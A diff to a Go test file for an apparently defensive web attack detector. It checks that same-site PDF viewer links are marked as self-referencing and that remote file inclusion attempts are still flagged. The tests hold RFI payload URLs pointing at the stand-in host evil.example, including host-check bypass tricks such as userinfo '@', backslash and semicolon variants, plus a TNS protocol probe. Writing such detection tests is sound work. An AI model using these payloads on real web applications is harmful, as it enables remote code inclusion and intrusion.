@@ -132,21 +132,28 @@ func TestProductionFalsePositives(t *testing.T) {
 	web := func(method, uri string, status int) []model.Hit {
 		return e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.90", Host: "app.example.com", Method: method, URI: uri, Status: status, Bytes: 5000, UA: "Mozilla/5.0"})
 	}
-	if h := hitIDs(web("GET", "/static/pdf/web/viewer.html?file=https://app.example.com:443/group1/M00/0B/53/a.pdf", 200)); h["rfi"].RuleID != "" {
-		t.Errorf("本站的 pdf 预览地址不是远程文件包含: %+v", h["rfi"])
+	// 指向请求的 Host 的地址：引擎标为 SelfRef，由状态库确认 Host 是真实站点后丢弃（见 store 的 TestSelfRefRFI）
+	if h := hitIDs(web("GET", "/static/pdf/web/viewer.html?file=https://app.example.com:443/group1/M00/0B/53/a.pdf", 200)); !h["rfi"].SelfRef {
+		t.Errorf("本站的 pdf 预览地址应标为指向本站: %+v", h["rfi"])
 	}
-	if h := hitIDs(web("GET", "/static/pdf/web/viewer.html?file=https://files.example.com/a.pdf", 200)); h["rfi"].RuleID != "" {
-		t.Errorf("同一主域名的地址不是远程文件包含: %+v", h["rfi"])
+	if h := hitIDs(web("GET", "/static/pdf/web/viewer.html?file=https://files.example.com/a.pdf", 200)); !h["rfi"].SelfRef {
+		t.Errorf("同一主域名的地址应标为指向本站: %+v", h["rfi"])
 	}
 	// Host 头带端口、参数中的域名大写：仍是本站
 	if h := hitIDs(e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.90", Host: "App.Example.com:443", Method: "GET",
-		URI: "/static/pdf/web/viewer.html?file=https://APP.example.com:443/a.pdf", Status: 200, Bytes: 5000, UA: "Mozilla/5.0"})); h["rfi"].RuleID != "" {
-		t.Errorf("Host 头带端口时本站的 pdf 预览地址不是远程文件包含: %+v", h["rfi"])
+		URI: "/static/pdf/web/viewer.html?file=https://APP.example.com:443/a.pdf", Status: 200, Bytes: 5000, UA: "Mozilla/5.0"})); !h["rfi"].SelfRef {
+		t.Errorf("Host 头带端口时本站的 pdf 预览地址应标为指向本站: %+v", h["rfi"])
 	}
-	for _, uri := range []string{"/x.php?file=http://evil.example/shell.txt", "/x.php?file=http://app.example.com@evil.example/s.txt", "/x.php?page=http://app.example.com.evil.example/s.txt"} {
-		if _, ok := hitIDs(web("GET", uri, 200))["rfi"]; !ok {
-			t.Errorf("%s 应命中远程文件包含", uri)
+	for _, uri := range []string{"/x.php?file=http://evil.example/shell.txt", "/x.php?file=http://app.example.com@evil.example/s.txt", "/x.php?page=http://app.example.com.evil.example/s.txt",
+		"/x.php?page=http://app.example.com:x@evil.example/s.txt", "/x.php?page=http://app.example.com%5c@evil.example/s.txt", "/x.php?page=http://app.example.com;@evil.example/s.txt",
+		"/x.php?lang=http://app.example.com/&page=http://evil.example/s.txt"} {
+		if h, ok := hitIDs(web("GET", uri, 200))["rfi"]; !ok || h.SelfRef {
+			t.Errorf("%s 应命中远程文件包含（不是指向本站）: %+v", uri, h)
 		}
+	}
+	// IP 地址只认完全相同
+	if h := hitIDs(e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.90", Host: "203.0.113.5", Method: "GET", URI: "/x.php?page=http://45.67.113.5/s.txt", Status: 200, Bytes: 5000, UA: "Mozilla/5.0"})); h["rfi"].SelfRef || h["rfi"].RuleID == "" {
+		t.Errorf("末两段相同的 IP 不是本站: %+v", h["rfi"])
 	}
 	// 二进制协议发往 HTTP 端口：只是协议探测（低危），不是空字节截断
 	hits := e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.91", URI: "\x00m\x00\x00\x01\x00\x00\x00\x018\x01,(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=x))))", Status: 400})
